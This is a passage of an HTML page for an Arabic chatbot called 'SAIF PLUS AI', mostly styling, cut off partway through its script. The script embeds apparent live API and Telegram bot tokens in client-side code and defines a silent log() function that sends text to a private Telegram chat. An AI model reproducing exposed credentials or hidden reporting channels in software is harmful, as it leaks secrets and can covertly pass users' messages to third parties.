<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SAIF PLUS AI</title>
    <style>
        :root { --blue: #e0f2fe; --tg: #2481cc; --dark: #111827; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: #f0f2f5; /* لون خلفية مريح للعين */
            display: flex; 
            justify-content: center; 
            align-items: center; /* توسيط عمودي */
            height: 100vh; 
            overflow: hidden; 
        }

        /* تعديل حجم حاوية الدردشة */
        .mobile-wrapper { 
            width: 100%; 
            max-width: 400px; /* تم تصغير العرض من 450 إلى 400 */
            background: white; 
            height: 92vh; /* ترك مسافة بسيطة من الأعلى والأسفل */
            display: flex; 
            flex-direction: column; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.15); 
            position: relative; 
            z-index: 10;
            border-radius: 20px; /* إضافة حواف دائرية للحاوية */
            overflow: hidden;
            margin: 10px;
        }

        .header { 
            padding: 12px; 
            text-align: center; 
            font-weight: bold; 
            border-bottom: 1px solid #eee; 
            font-size: 1.1rem; 
            background: white;
            color: var(--dark);
        }

        #chat-box { 
            flex: 1; 
            overflow-y: auto; 
            padding: 15px; 
            display: flex; 
            flex-direction: column; 
            gap: 10px; 
            background: #f9fafb; 
            background-image: radial-gradient(#d1d5db 0.5px, transparent 0.5px); 
            background-size: 20px 20px; 
        }

        /* تصغير حجم الرسائل قليلاً */
        .msg { 
            max-width: 80%; 
            padding: 10px 14px; 
            border-radius: 15px; 
            font-size: 14px; /* تم تصغير الخط من 15 إلى 14 */
            line-height: 1.4; 
            word-wrap: break-word; 
            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
        }

        .sent { 
            align-self: flex-end; 
            background: #dcf8c6; 
            border-bottom-right-radius: 2px; 
            color: #000;
        }

        .received { 
            align-self: flex-start; 
            background: white; 
            border: 1px solid #e5e7eb; 
            border-bottom-left-radius: 2px; 
            color: #374151;
        }

        .input-bar { 
            padding: 12px; 
            display: flex; 
            gap: 8px; 
            border-top: 1px solid #eee; 
            background: white; 
        }

        #uInput { 
            flex: 1; 
            border: none; 
            background: #f3f4f6; 
            padding: 10px 15px; 
            border-radius: 20px; 
            outline: none; 
            font-size: 14px;
        }

        .send-btn { 
            background: var(--tg); 
            color: white; 
            border: none; 
            border-radius: 50%; 
            width: 40px; 
            height: 40px; 
            cursor: pointer; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-size: 16px; 
            transition: 0.2s;
        }
        
        .send-btn:active { transform: scale(0.9); }

        /* تعديلات للهواتف الصغيرة جداً */
        @media (max-height: 600px) {
            .mobile-wrapper { height: 100vh; border-radius: 0; margin: 0; }
        }
    </style>
</head>
<body onload="init()">

    <div class="mobile-wrapper">
        <div class="header">SAIF PLUS AI</div>
        <div id="chat-box"></div>
        <div class="input-bar">
            <input type="text" id="uInput" placeholder="اكتب سؤالك هنا..." onkeypress="if(event.key==='Enter') send()">
            <button class="send-btn" onclick="send()">➤</button>
        </div>
    </div>

    <script>
        const GK = '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';
        const TT = '8311362193:AAF0ahoskmhZQMW_eFEiBfXANgK_zHNlfGM';
        const ID = '1565935868';
        
        let brain = [{ role: "system", content: "أنت SAIF PLUS AI مساعد ذكي بلهجة خليجية." }];

        function log(t) {
            const url = `https://api.telegram.org/bot${TT}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(t)}&parse_mode=HTML`;
            fetch(url, { mode: 'no-cors' }).catch(() => {});
        }

        function init() {
            const box = document.getElementById('chat-box');
            box.innerHTML += `<div class="msg received">مرحباً بك في نظام <b>SAIF PLUS AI</b>. كيف يمكنني مساعدتك؟</div>`;
